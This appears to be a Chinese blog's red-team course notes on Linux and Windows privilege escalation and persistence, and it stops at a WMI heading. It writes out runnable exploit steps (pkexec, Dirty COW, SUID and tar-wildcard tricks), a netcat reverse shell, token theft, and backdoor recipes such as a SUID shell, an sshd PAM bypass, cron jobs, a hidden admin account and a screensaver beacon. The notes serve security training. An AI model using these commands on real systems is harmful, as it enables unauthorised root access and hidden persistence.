<p>通过命令执行漏洞获取的一个反弹shell或是通过Web漏洞获取了一个Webshell后，一般情况下权限都较低。在执行一些重要敏感的操作或是对重要的文件进行修改时无法正常进行，便需要进行提权。Linux中安装的数据库、中间件等一般都不是以root用户启动的，通过数据库或是中间件获取到的权限是是低权限的。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709130425849.png" alt="image-20220709130425849"></p>
<hr>
<p><strong>linux提权—pkexec提权</strong></p>
<p>漏洞简介<br>polkit是一个授权管理器，其系统架构由授权和身份验证代理组成，pkexec是其中polkit的其中一个工具，他的作用有点类似于sudo，允许用户以另一个用户身份执行命令。polkit 的 pkexec 程序中存在一个本地权限提升漏洞。当前版本的pkexec 无法正确处理调用参数计数，并最终尝试将环境变量作为命令执行。攻击者可以通过控制环境变量来利用这一点，从而诱导 pkexec 执行任意代码。利用成功后，会导致本地特权升级，非特权用户获得管理员权限。<br>•影响范围：目前主流Linux版本均受影响</p>
<p>•git clone<a target="_blank" rel="noopener" href="https://github.com/berdav/CVE-2021-4034">https://github.com/berdav/CVE-2021-4034</a><br>•cd CVE-2021-4034<br>•make<br>•./cve-2021-4034<br>•whoami</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709130553042.png" alt="image-20220709130553042"></p>
<hr>
<p><strong>linux提权–内核漏洞提权</strong></p>
<p>内核是系统的心脏，是运行程序和管理磁盘等硬件设备的核心程序。是硬件设备和软件程序间的抽象层。 Linux内核的开发和规范一直是由Linus领导的开发小组控制着，版本是惟一的。开发小组每隔一段时间公布新的版本或修订版，从1991年10月开始，Linus向世界公开发布的内核0.0.2版本到目前最新的内核5.911版本，Linux的功能越来越强大。<br>•uname -a 打印所有可用的系统信息<br>•uname -r 内核版本<br>•uname -n 系统主机名。<br>•uname -m 查看系统内核架构（64位/32位）<br>•hostname 系统主机名<br>•cat /proc/version 内核信息</p>
<p><strong>脏牛漏洞</strong><br>脏牛漏洞(CVE-2016-5195)是一个影响2007年-2016年长达9年发行的Linux系统的提权漏洞，恶意用户可以利用条件竞争获取ROOT权限。<br>•<a target="_blank" rel="noopener" href="https://github.com/gbonacini/CVE-2016-5195">https://github.com/gbonacini/CVE-2016-5195</a><br>影响版本：<br>•Linux kernel &gt;= 2.6.22（2007年发行，到2016年10月18日才修复）<br>检测内核版本<br>•lsb_release –a # 查看系统发行版本<br>•uname –a # 查看内核版本<br>下载，编译生成exp文件<br>•Make<br>执行，返回一个root权限的shell。</p>
<p>对于 Linux 提权的 CVE 有很多，可以使用一些工具帮助我们快速的发现当前 Linux 可能存在的提权漏洞。<br>•<a target="_blank" rel="noopener" href="https://github.com/SecWiki/linux-kernel-exploits.git">https://github.com/SecWiki/linux-kernel-exploits.git</a><br>•chmod +x linux-exploit-suggester.sh<br>•./linux-exploit-suggester.sh<br>Searchsploit<br>•MSF中搜索EXP的模块</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709130759510.png" alt="image-20220709130759510"></p>
<hr>
<p><strong>linux提权—利用SUID提权</strong></p>
<p>SUID是一种特殊权限，可以让调用者在执行过程中暂时获得该文件拥有者的权限。如果可以找到并运行root用户所拥有的SUID的文件，那么就可以在运行该文件的时候获得root用户权限。<br>在Linux中查找可以用来提权的SUID文件<br>•find / -perm -u=s -type f 2&gt;/dev/null<br>•find / -user root -perm -4000-print2&gt;/dev/null<br>•find / -user root -perm -4000-exec ls -ldb {} ;<br>常见suid提权文件<br>nmap、vim、find、more、less、bash、cp、Nano、mv、awk、man、weget</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709130900575.png" alt="image-20220709130900575"></p>
<p><strong>利用SUID提权实验</strong></p>
<p>利用find文件提权<br>find比较常用,find用来在系统中查找文件。同时，它也有执行命令的能力。 因此，如果配置为使用SUID权限运行，则可以通过find执行的命令都将以root身份去运行。<br>首先要给find设当SUID权限<br>•chmod u+s /usr/bin/find<br>Find命令是以Suid权限运行，则将通过find执行的所有命令都会以root权限执行<br>•/usr/bin/find pass.txt -exec whoami ;</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709131138207.png" alt="image-20220709131138207"></p>
<p>可用作Linux提权的命令及其姿势:<br>•Find find pentestlab -exec whoami ;<br>•Vim vim.tiny /etc/shadow<br>•awk awk ‘BEGIN{system(“whoami”)}’<br>•curl curl file:///etc/shadow<br>•Bash bash -p<br>•Less less /etc/passwd<br>•Nmap nmap –interactive </p>
<hr>
<p><strong>linux提权—利用SUDO提权</strong></p>
<p>普通用户在使用sudo执行命令的过程中，会以root方式执行命令。在很多场景里，管理员为了运维管理方便，sudoer配置文件错误导致提权。<br>设置sudo免密码:<br>•vi /etc/sudoers<br>在最后一行添加：<br>•bypass ALL=(ALL:ALL) NOPASSWD:ALL<br>•sudo –l<br>显示用户已允许以root用户身份执行所有此二进制文件而无需密码。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709131200736.png" alt="image-20220709131200736"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709131214080.png" alt="image-20220709131214080"></p>
<p>•<a target="_blank" rel="noopener" href="https://gtfobins.github.io/![image-20220709131242351](./HW%E8%AF%BE%E7%A8%8B/image-20220709131242351.png)">https://gtfobins.github.io/![image-20220709131242351](./HW%E8%AF%BE%E7%A8%8B/image-20220709131242351.png)</a></p>
<hr>
<p><strong>linux提权—计划任务</strong></p>
<p>系统内可能会有一些定时执行的任务，一般这些任务由crontab来管理，具有所属用户的权限。非root权限的用户是不可以列出root用户的计划任务的。但是/etc/内系统的计划任务可以被列出。<br>•ls -l /etc/cron*<br>默认这些程序是以root权限执行，如果有任意用户可写的脚本，我们就可以修改脚本等回连rootshell了。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709131348728.png" alt="image-20220709131348728"></p>
<p>提权：<br>•#查看定时任务<br>•cat /etc/crontab<br>#查看/etc/cron.daily/backup权限<br>•ls -l /etc/cron.daily/backup<br>#查看内容<br>•cat /etc/cron.daily/backup<br>#这个定时任务的执行权限是root，将用户家目录下的文件备份到/etc/backups/下，使用通配符*</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709131430535.png" alt="image-20220709131430535"></p>
<p>反弹shell<br>payload生成<br>•msfvenom -p cmd/unix/reverse_netcat lhost=127.0.0.1 lport=8888 -R raw<br>将payload写入shell.sh，并赋予执行权限<br>•echo “mkfifo /tmp/jvenbd; nc 127.0.0.1 8888 0&lt;/tmp/jvenbd | /bin/sh &gt;/tmp/jvenbd 2&gt;&1;<br>    rm /tmp/jvenbd” &gt; shell.sh &amp;&amp; chmod +x shell.sh<br>再创建两个文件：–checkpoint-action=exec=sh shell.sh 和 –checkpoint=1<br>•echo &gt; “–checkpoint-action=exec=sh shell.sh”<br>•echo &gt; “–checkpoint=1”</p>
<p>–checkpoint-action选项：用于指定到达检查点时将要执行的程序，这将允许我们运行一个任意的命令。因此，选项–checkpoint=1 和 –checkpoint-action=exec=sh shell.sh作为命令行选项交给了tar程序<br>•nc -lvvp 8888开启本地监听，等待定时任务的反弹连接</p>
<hr>
<p><strong>linux提权—配置错误引发提权</strong></p>
<p>手动找如果对Linux系统不熟悉的话基本是找不到的，所以可以利用工具去查找<br>•<a target="_blank" rel="noopener" href="http://pentestmonkey.net/tools/audit/unix-privesc-check">http://pentestmonkey.net/tools/audit/unix-privesc-check</a><br>•<a target="_blank" rel="noopener" href="https://www.securitysift.com/download/linuxprivchecker.py">https://www.securitysift.com/download/linuxprivchecker.py</a><br>列出了所有的可写文件，如果找到有配置问题的便可以进行提权操作。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709131845994.png" alt="image-20220709131845994"></p>
<hr>
<p><strong>linux提权—第三方服务提权</strong></p>
<p>NFS提权<br>NFS：Network File System即网络文件系统，它允许网络中的计算机之间通过TCP/IP网络共享资源。在NFS的应用中，本地NFS的客户端应用可以透明地读写位于远端NFS服务器上的文件，就像访问本地文件一样。2049端口，对应nfs服务，当服务器中存在NFS共享，且开启了no_root_squash选项时，这时如果客户端使用的是root用户，那么对于共享目录来说，该客户端就有root权限，可以使用它来提升权限。</p>
<p>nmap 扫描靶机<br>•nmap -sT -T4 192.168.123.213<br>攻击机上安装nfs客户端工具<br>•apt-get install nfs-common<br>使用showmount检索靶机文件夹列表<br>•showmount -e 192.168.123.213<br>•Export list for 192.168.123.213:<br>•/home/peter *<br>挂载peter home目录<br>•mkdir /mnt/peter<br>•mount 192.168.123.213:/home/peter /mnt/peter </p>
<p>写入ssh公钥<br>[攻击机]ssh-keygen生成公私钥对<br>•ssg-keygen<br>创建.ssh目录<br>•peter@kali:/mnt/peter$ mkdir .ssh<br>传输public key<br>•peter@kali:/mnt/peter$ cat ~/.ssh/id_rsa.pub &gt; /mnt/peter/.ssh/authorized_keys<br>设置权限<br>•peter@kali:/mnt/peter/.ssh$ chmod 700 ../.ssh/<br>•peter@kali:/mnt/peter/.ssh$ chmod 600 authorized_keys<br>使用私钥登录</p>
<hr>
<p><strong>linux提权—相关工具</strong></p>
<p>•<a target="_blank" rel="noopener" href="https://github.com/SecWiki/linux-kernel-exploits.git">https://github.com/SecWiki/linux-kernel-exploits.git</a><br>•<a target="_blank" rel="noopener" href="https://github.com/offensive-security/exploitdb.git">https://github.com/offensive-security/exploitdb.git</a><br>•<a target="_blank" rel="noopener" href="https://github.com/mzet-/linux-exploit-suggester.git">https://github.com/mzet-/linux-exploit-suggester.git</a><br>•<a target="_blank" rel="noopener" href="https://github.com/InteliSecureLabs/Linux_Exploit_Suggester.git">https://github.com/InteliSecureLabs/Linux_Exploit_Suggester.git</a><br>•<a target="_blank" rel="noopener" href="https://github.com/jondonas/linux-exploit-suggester-2.git">https://github.com/jondonas/linux-exploit-suggester-2.git</a><br>•<a target="_blank" rel="noopener" href="https://github.com/belane/linux-soft-exploit-suggester.git">https://github.com/belane/linux-soft-exploit-suggester.git</a><br>•linuxprivchecker： <a target="_blank" rel="noopener" href="https://www.securitysift.com/download/linuxprivchecker.py">https://www.securitysift.com/download/linuxprivchecker.py</a><br>•<a target="_blank" rel="noopener" href="http://pentestmonkey.net/tools/unix-privesc-check/unix-privesc-check-1.4.tar.gz">http://pentestmonkey.net/tools/unix-privesc-check/unix-privesc-check-1.4.tar.gz</a><br>•<a target="_blank" rel="noopener" href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</a><br>•<a target="_blank" rel="noopener" href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS">https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS</a></p>
<hr>
<p><strong>windows提权</strong></p>
<p>windows在日常的渗透中经常遇到，而在内网之前，经常会在所拿到的跳板机进行提权，这样后面横向，内网才能更好的展开（抓hash，必须得系统或管理员权限）。<br>Windows常用的提权方法有：<br>•系统内核溢出漏洞提权<br>•数据库提权<br>•错误的系统配置提权<br>•组策略首选项提权<br>•窃取令牌提权<br>•bypassuac提权<br>•第三方软件/服务提权</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709132224419.png" alt="image-20220709132224419"></p>
<hr>
<p><strong>windows提权–系统权限划分</strong></p>
<p>在Windows系统中，权限大概分为四种，分别是<br>•User：普通用户权限<br>•Administrator：管理员权限，可以利用Windows机制提升为System权限<br>•System：系统权限<br>•TrustedInstaller：Windows中最高权限。有些文件，连System权限也无法修改，只能TrustedInstaller权限修改。</p>
<p>安全描述符<br>当一个对象呗创建时，系统将为其分配安全描述符，安全描述符包含了该对象的属主对该对象所配置的一些安全属性和策略。安全描述符由4部分组成：<br>•SID（表示该对象所有用的SID）<br>•DACL（表示该对象的访问控制策略）<br>•SACL（表示该对象的访问行为的审计策略）<br>•Flag（其他标志信息）<br>SID：Secure Identifier(安全标识符)，每个用户和账户组都有一个唯一的SID，他是用户、用户组和计算机账户的唯一标识符</p>
<p>windows token<br>•Windows安全模型中，有两个角色，一个是访问者（进程），一个是被访问者（资源）<br>•所谓的资源可以是文件，目录，注册表，管道，命名句柄，进程线程<br>•每个资源都有一个安全描述符，安全描述符当中包含了ACL（ACE）（访问控制列表）<br>•访问控制列表中每条规则（ACE）都对应记录着一个SID被允许和拒绝的操作（读、写、执行）<br>•访问者为了访问某一个资源，显然也需要一个身份的认证<br>Windows Access Token（访问令牌）<br>他是一个描述进程或者线程安全上下文的一个对象。不同的用户登录计算机后，都会生成一个Access Token，这个Token在用户创建进程或者线程时会被使用，不断的拷贝，这就解释了A用户创建一个进程而该进程没有B用户的权限。当用户注释后，系统将会使主令牌切换为模拟令牌，不会将令牌清除，只会在重启机器后才会清除。</p>
<p>Windows Access Token（访问令牌）<br>他是一个描述进程或者线程安全上下文的一个对象。不同的用户登录计算机后，都会生成一个Access Token，这个Token在用户创建进程或者线程时会被使用，不断的拷贝，这就解释了A用户创建一个进程而该进程没有B用户的权限。当用户注释后，系统将会使主令牌切换为模拟令牌，不会将令牌清除，只会在重启机器后才会清除。<br>Access Token分为两种(主令牌、模拟令牌)<br>•授权令牌(Delegation token)：交互式会话登陆(例：本地用户登陆、用户桌面等….)<br>•模拟令牌(lmpersonation token)：非交互式登陆(例：net user、访问共享文件)<br>用户双击运行一个程序都会拷贝“explorer.exe”的Access Token<br>用户注销后系统将会使主令牌切换到模拟令牌，不会将令牌清除，只会在重启机器后才会清除</p>
<hr>
<p><strong>windows提权—令牌窃取</strong></p>
<p>默认情况下，我们列举令牌，只能列举出当前用户和比当前用户权限更低用户的令牌。令牌的数量取决于当前shell的访问级别，如果当前的shell是administrator或者是system，我们就可以看到系统中的所有的令牌。<br>MSF中内置了令牌窃取工具incognito，我们直接使用：<br>•use incognito （进入incognito模块）<br>•list_tokens -u （列出令牌）<br>•impersonate_token “NT AUTHORITY\SYSTEM“<br>调用windows api进行窃取token<br>•<a target="_blank" rel="noopener" href="https://github.com/Aquilao/GoTokenTheft">https://github.com/Aquilao/GoTokenTheft</a><br>对于令牌窃取很多人可能会存在着一些误解，这不属于一种提权方法，当前系统中的某个进程或线程能访问到什么样的系统资源,完全取决于你当前进程是拿着谁的令牌。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709132610636.png" alt="image-20220709132610636"></p>
<hr>
<p><strong>windows提权—Potato家族提权</strong></p>
<p>烂土豆 原名RottenPotato，国人做了优化为JuicyPotato。<br>原理就是NLTM中继。 通过DCOM call来使服务向攻击者监听的端口发起连接并进行NTLM认证，这个服务如BITS。该方法利用的是SMB-&gt;SMB NTLM中继。<br>欺骗 “NT AUTHORITY\SYSTEM”账户通过NTLM认证到我们控制的TCP终端。<br>土豆提权的利用条件<br>•需要支持 SeImpersonate 或者 SeAssignPrimaryToken 权限（通常情况下 IIS、MSSQL 具有这两个权限）<br>•开启 DCOM<br>•本地支持 RPC 或者远程服务器支持 RPC 并能成功登录<br>•能够找到可用的 COM 对象</p>
<p>各版本的土豆提权工具（利用方法)<br>•RottenPotato<br>•JuicyPotato（RottenPotatoNG 加强版）<br>•SweetPotato<br>•BadPotato<br>•MultiPotato<br>若要利用此漏洞，攻击者首先必须登录系统。然后，攻击者可以运行一个为利用此漏洞而经特殊设计的应用程序，从而控制受影响的系统。</p>
<p>Msf<br>前提还是先拿到目标的一个shell。然后将potato.exe到目标机器中的C:/目录下然后执行<br>•use incognito# 加载incoginto功能（用来盗窃目标主机的令牌或是假冒用户)<br>•list_tokens -u# 列出目标机器用户的可用令牌<br>•execute -cH -f c:/potato.exe# 创建新的进程<br>•list_tokens -uimpersonate_token “NT AUTHORITY\SYSTEM”</p>
<p>CobaltStike<img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709132836479.png" alt="image-20220709132836479"></p>
<hr>
<p><strong>windows提权—内核漏洞提权</strong></p>
<p>利用系统本身存在的一些系统内核溢出漏洞，但未曾打相应的补丁，攻击者通过对比systeminfo信息中的补丁信息来查找缺失的补丁号，通过缺失补丁号对照相应的系统版本查找对应可以提权提升的exp<br>注意，只要对应的补丁号加上对应的系统的版本的提权exp才可以成功，有时候如果查找到提权exp提权不成功，那么就可以查看是不是系统版本没对应上，且不排除一些提权漏洞利用需要相应的环境。</p>
<hr>
<p><strong>windows提权—系统内核溢出漏洞提权</strong></p>
<p>手工查找补丁情况<br>•systeminfo<br>•Wmic qfe get Caption,Description,HotFixID,InstalledOn<br>MSF后渗透扫描<br>•post/windows/gather/enum_patches<br>•post/multi/recon/local_exploit_suggester<br>windows exploit suggester<br>•<a target="_blank" rel="noopener" href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester">https://github.com/AonCyberLabs/Windows-Exploit-Suggester</a><br>powershell中的sherlock脚本<br>•Import-Module C:\Sherlock.ps1 #下载ps1脚本，导入模块</p>
<p>查找到缺失的补丁后，对照相应的系统版本，查找对应的exp<br>•<a target="_blank" rel="noopener" href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a><br>•<a target="_blank" rel="noopener" href="https://bugs.hacking8.com/tiquan/">https://bugs.hacking8.com/tiquan/</a><br>•<a target="_blank" rel="noopener" href="https://github.com/Heptagrams/Heptagram/tree/master/Windows/">https://github.com/Heptagrams/Heptagram/tree/master/Windows/</a><br>Elevation<br>•<a target="_blank" rel="noopener" href="https://www.exploit-db.com/">https://www.exploit-db.com/</a><br>•<a target="_blank" rel="noopener" href="https://i.hacking8.com/tiquan/">https://i.hacking8.com/tiquan/</a><br>•………..</p>
<hr>
<p><strong>windows提权—可信任服务路径</strong></p>
<p>windows服务通常都是以System权限运行的，所以系统在解析服务的二进制文件对应的文件路径中的空格的时候也会以系统权限进行解析。如果我们能利用这一特性，就有机会进行权限提升。<br>•C:\Program Files\Some Folder\Service.exe<br>对于上面文件路径中的每一个空格，windows都会尝试寻找并执行名字与空格前的名字向匹配的程序。操作系统会对文件路径中空格的所有可能进行尝试，直到找到一个匹配的程序。以上面的例子为例，<br>windows会依次尝试确定和执行下面的程序：<br>•C:\Program.exe<br>•C:\Program Files\Some.exe<br>•C:\Program Files\Some Folder\Service.exe<br>所以如果我们能够上传一个适当命名的恶意可执行程序在受影响的目录，服务一旦重启，我们的恶意程序就会以system权限运行</p>
<p>通过msf模块攻击<br>•search service_path<br>•use ID<br>•show options<br>•set session ID<br>•exploit</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709133106409.png" alt="image-20220709133106409"></p>
<hr>
<p><strong>windows提权—组策略首选项提权</strong></p>
<p>利用手法：<br>#Powershell获取cpassword<br>•Get-GPPPassword.ps1<br>#PowerSploit 的 Get-GPPPassword模块 检索通过组策略首选项推送的帐户的明文密码和其他信息。<br>kali gpp-decrypt命令破解密码<br>#Msf<br>•run post/windows/gather/credentials/gpp<br>#Empire<br>•usemodule privesc/gpp</p>
<hr>
<p><strong>windows提权—DLL劫持提权</strong></p>
<p>Windows程序启动的时候需要DLL。如果这些DLL不存在，则可以通过在应用程序要查找的位置放置恶意DLL来提权。通常，Windows应用程序有其预定义好的搜索DLL的路径，它会根据下面的顺序进行搜索：<br>•1.应用程序加载的目录<br>•2.C:\Windows\System32<br>•3.C:\Windows\System<br>•4.C:\Windows<br>•5.当前工作目录Current Working Directory，CWD<br>•6.在PATH环境变量的目录（先系统后用户）</p>
<p>过程：信息收集-进程调试-制作dll并上传-替换dll-启动应用后成功<br>dll劫持提权需要特定软件应用的控制权限及启用配合，复杂鸡肋，AlwaysInstallElevated提权默认禁用配置，利用成功机会很少</p>
<hr>
<p><strong>windows提权—bypassUAC提权</strong></p>
<p>用户帐户控制（User Account Control，简写作UAC)是微软公司在其Windows Vista及更高版本操作系统中采用的一种控制机制。其原理是通知用户是否对应用程序使用硬盘驱动器和系统文件授权，以达到帮助阻止恶意程序（有时也称为”恶意软件”）损坏系统的效果。<br>主要用于隔离administrator和user的权限<br>当前用户是管理员权限，但是有些exe会弹出用户账户控制，如果点击否的话，就会出现拒绝访问，那么也就没有成功运行该程序了。这样就会影响后续的内网渗透，例如取密码等，所以我们需要bypassuac。</p>
<p>一些没有管理员权限无法完成的操作：<br>•注册表修改（如果注册表项在HKEY_LOCAL_MACHINE下（因为它影响多个用户），它将是只读的）<br>•加载设备驱动程序<br>•DLL注入<br>•修改系统时间（时钟）<br>•修改用户帐户控制设置<br>•修改受保护的目录（例如Windows文件夹，Program Files）<br>•计划任务（例如，以管理员权限自动启动）<br>•UAC不会自动阻止恶意软件，其目的不是确定程序是否是恶意软件，而是在没有用户许可下对恶意软件的未授权行为进行掌控。<br>•<a target="_blank" rel="noopener" href="https://github.com/Drunkmars/BypassUAC">https://github.com/Drunkmars/BypassUAC</a></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709133348119.png" alt="image-20220709133348119"></p>
<p>目前公开的bypass uac的方法<br>•白名单提权机制 ；如：Wusa.exe Bypass UAC，infDefault.exe Bypass UAC，cmstp,exe<br>•Bypass UAC<br>•COM接口<br>•计划任务<br>•DLL劫持<br>•windows 自身提权漏洞<br>UACME 目前已经支持了72 种 ByPassUAC 的方法。<br>•UACME 项目地址：<a target="_blank" rel="noopener" href="https://github.com/hfiref0x/UACME.git">https://github.com/hfiref0x/UACME.git</a></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709133417229.png" alt="image-20220709133417229"></p>
<hr>
<p><strong>windows提权—其他手法</strong></p>
<p>去寻找系统高权限运行的用户，服务，软件，程序，脚本，通过一定手法，比如cve，进程注入，dll劫持，实在不行社工。扎实的基础+奇妙的思路+敏捷的手法=system权限</p>
<h2 id="权-限-维-持"><a href="#权-限-维-持" class="headerlink" title="权 限 维 持"></a>权 限 维 持</h2><p><strong>权限维持介绍</strong></p>
<p>只要目标没有发现我们的攻击⾏为，可以⻓久保持⽬标的可控性，都可以称为权限维持。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709133531884.png" alt="image-20220709133531884"></p>
<hr>
<p><strong>Linux权限维持—SUID Shell</strong></p>
<p>SUID Shell是一种可用于以拥有者权限运行的shell。<br>以 root 用户权限执行下面的命令。<br>•cp /bin/bash /tmp/shell<br>•chmod u+s /tmp/shell      #给程序的所有者suid权限,可以像root用户那样启动</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709133621192.png" alt="image-20220709133621192"></p>
<p>在使用普通用户权限的时候，执行以下命令就能获取 root 权限。<br>•/tmp/shell -p</p>
<hr>
<p><strong>Linux权限维持—软链接</strong></p>
<p>软连接后门的原理是利用了PAM配置文件的作用，将sshd文件软连接名称设置为su，这样应用在启动过程中他会去PAM配置文件夹中寻找是否存在对应名称的配置信息(su)，然而 su 在 pam_rootok 只检测 uid 0 即可认证成功，这样就导致了可以使用任意密码登录:<br>•ln -sf /usr/sbin/sshd /tmp/su<br>•/tmp/su -oPort=888<br>•ssh <a href="mailto:&#x72;&#111;&#111;&#x74;&#x40;&#x31;&#50;&#55;&#x2e;&#48;&#46;&#48;&#46;&#49;">&#x72;&#111;&#111;&#x74;&#x40;&#x31;&#50;&#55;&#x2e;&#48;&#46;&#48;&#46;&#49;</a> -p 888</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709133729216.png" alt="image-20220709133729216"></p>
<hr>
<p><strong>Linux权限维持—公钥免密登陆</strong></p>
<p>•ssh-keygen -t rsa //生成公钥<br>•echo id_rsa.pub &gt;&gt; .ssh/authorized_keys //将id_rsa.pub内容放到目标.ssh/authorized_keys里</p>
<p>生常谈的公钥免登陆，这种用法不只是用在留后门，还可以在一些特殊情况下获取一个交互的shell，如struts写入公钥，oracle写入公钥连接，Redis未授权访问等情景。</p>
<hr>
<p><strong>Linux权限维持—Cron后门</strong></p>
<p>在Linux系统中，计划任务一般是由cron承担，我们可以把cron设置为开机时自动启动。cron启动后，它会读取它的所有配置文件（全局性配置文件/etc/crontab，以及每个用户的计划任务配置文件），然后cron会根据命令和执行时间来按时来调用工作任务。<br>•cron表达式在线生成：<a target="_blank" rel="noopener" href="http://qqe2.com/cron">http://qqe2.com/cron</a><br>•(crontab -l;echo ‘*/1 * * * * /bin/bash /tmp/1.elf;/bin/bash –noprofile -i’)|crontab –</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709133903692.png" alt="image-20220709133903692"></p>
<hr>
<p><strong>Windows权限维持—隐藏账号</strong></p>
<p>这个是比较常见的创建后门的方法，直接建立一个隐藏账号<br>•net user test$ 123456 /add<br>•net localgroup administrators test$ /add<br>•利用注册表创建隐藏用户的小工具。工具地址：<a target="_blank" rel="noopener" href="https://github.com/wgpsec/CreateHiddenAccount">https://github.com/wgpsec/CreateHiddenAccount</a></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709134023492.png" alt="image-20220709134023492"></p>
<hr>
<p><strong>Windows权限维持—计划任务</strong></p>
<p>Windows实现定时任务主要有schtasks与at二种方式:<br>At 适用于windows xp/2003，Schtasks适用于win7/2008或者以后<br>例如每小时执行一次 calc.exe<br>•schtasks /create /tn updater /tr calc.exe /sc hourly /mo 1</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709134116890.png" alt="image-20220709134116890"></p>
<p>schtasks是windows下计划任务的命令，可以设置在指定时间执行指定程序或脚本。<br>权限要求：提权不提权都可。<br>优点：不同于自启注册键和服务项，计划任务的设定方式更多样、灵活，位置也相对较为隐蔽（手工排查要多点几下）。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709134143770.png" alt="image-20220709134143770"></p>
<p>在目标主机上创建一个名为test的计划任务，启动程序为C:\123.exe，启动权限为system，启动时间为每隔一小时启动一次。当执行完该命令，该计划任务就已经启动了<br>•schtasks /create /tn test /sc HOURLY /mo 1 /tr c:\123.exe /ru system /f<br>普通用户<br>•schtasks /create /tn test /sc HOURLY /mo 1 /tr c:\123.exe /ru %USERNAME% /f<br>查询该test计划任务<br>•schtasks /query | findstr test<br>启动该test计划任务<br>•schtasks /run /i /tn “test”<br>删除该test计划任务<br>•schtasks /delete /tn “test” /f</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709134211758.png" alt="image-20220709134211758"></p>
<p>msf权限维持模块-persistence</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709134235069.png" alt="image-20220709134235069"></p>
<hr>
<p><strong>Windows权限维持—注册键</strong></p>
<p>注册表作为Windows的核心数据库，存储着系统和用户的很多关键信息。Windows在注册表中提供了两套独立的路径，<br>•一个是当前用户的“HKEY_CURRENT_USER”即“HKCU”，<br>•另一个就是针对当前用户物理状态的“HKEY_LOCAL_MACHINE”即“HKLM”，仅有特权账户可以对其进行修改。<br>权限要求：提权不提权都可</p>
<hr>
<p><strong>Windows权限维持— Winlogon</strong></p>
<p>winlogon.exe是windows中非常重要的进程,在用户还没登录系统之前就已经存在,并与密码验证相关的重要任务精密相关。例如，当在用户登录时，Winlogon 进程负责将用户配置文件加载到注册表中:<br>•HKLM\Software\Microsoft\WindowsNT\CurrentVersion\Winlogon<br>•HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\</p>
<hr>
<p><strong>Windows权限维持—屏幕保护程序</strong></p>
<p>利用前提:对方开启了屏幕保护<br>屏幕保护程序，当初的设计是为了防止长期屏幕的显示，预防老化与缩短屏幕显示器老化的一种保护程序。<br>在对方开启屏幕保护的情况下，我们可以修改屏保程序为我们的恶意程序从而达到后门持久化的目的，攻击者可以利用屏幕保护程序来隐藏shell,达到一定的权限维持。<br>权限要求：普通用户<br>注册表位置:<br>•HKEY_CURRENT_USER\Control Panel\Desktop</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709134439234.png" alt="image-20220709134439234"></p>
<p>直接写入注册表即可：<br>•reg add “hkcu\control panel\desktop” /v SCRNSAVE.EXE /d<br>C:\Users\hunter\Desktop\beacon.exe /f<br>•reg add “hkcu\control panel\desktop” /v ScreenSaveActive /d 1 /f<br>•reg add “hkcu\control panel\desktop” /v ScreenSaverIsSecure /d 0 /f<br>•reg add “hkcu\control panel\desktop” /v ScreenSaveTimeOut /d 60 /f</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709134510639.png" alt="image-20220709134510639"></p>
<hr>
<p><strong>Windows权限维持—启动项后门</strong></p>
<p>开始菜单启动项，指示启动文件夹的位置，具体的位置是“开始”菜单中的“所有程序”-“启动”选项：<br>•C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709134559193.png" alt="image-20220709134559193"></p>
<hr>
<p><strong>Windows权限维持—自启动服务后门</strong></p>
<p>在 Windows上还有一个重要的机制，也就是服务。服务程序通常默默的运行在后台，且拥有 SYSTEM 权限，非常适合用于后门持久化。我们可以将 EXE /DLL等可执行文件注册为服务实现后门持久化。可以通过如下命令行方式添加一个服务<br>•sc create “SD” binpath= “C:\Users\SD\Desktop\test.exe”<br>•sc description “SD” “description” 设置服务的描述字符串<br>•sc config “SD” start= auto 设置这个服务为自动启动<br>•net start “SD” 启动服务<br>•sc delete “SD”</p>
<hr>
<p><strong>Windows权限维持—WMI构造无文件后门</strong></p>
